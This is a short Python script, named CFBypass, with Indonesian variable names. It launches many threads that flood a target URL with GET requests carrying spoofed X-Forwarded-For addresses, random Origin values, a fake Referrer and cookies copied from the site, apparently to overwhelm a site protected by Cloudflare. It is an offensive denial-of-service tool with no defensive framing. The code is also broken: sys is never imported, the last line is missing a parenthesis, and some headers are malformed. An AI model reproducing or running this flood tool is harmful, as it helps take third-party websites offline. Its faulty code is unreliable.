import requests
import random
import time
import threading
import os

def string_acak_panjang(length):
    karakter = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(karakter) for _ in range(length))

def ip_acak():
    return f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def main(url, waktu):
    if len(sys.argv) <= 2:
        print("Penggunaan: python CFBypass.py <url> <waktu>")
        sys.exit(-1)

    def kirim_pengiriman():
        header = {
            'User-Agent': requests.get(url).headers['User-Agent'],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Upgrade-Insecure-Requests': 1,
            'cookie': requests.get(url).headers['Set-Cookie'],
            'Origin': f"http://{string_acak_panjang(10)}.com",
            'Referrer': f"http://google.com/{string_acak_panjang(10)}",
            'X-Forwarded-For': ip_acak()
        }
        requests.get(url, headers=header)

    benangs = []
    for _ in range(int(waktu)):
        benang = threading.Thread(target=kirim_pengiriman)
        benang.start()
        benangs.append(benang)

    for benang in benangs:
        benang.join()

    print("CFBypass selesai.")

if __name__ == "__main__":
    main(sys.argv[1], sys.argv[2]
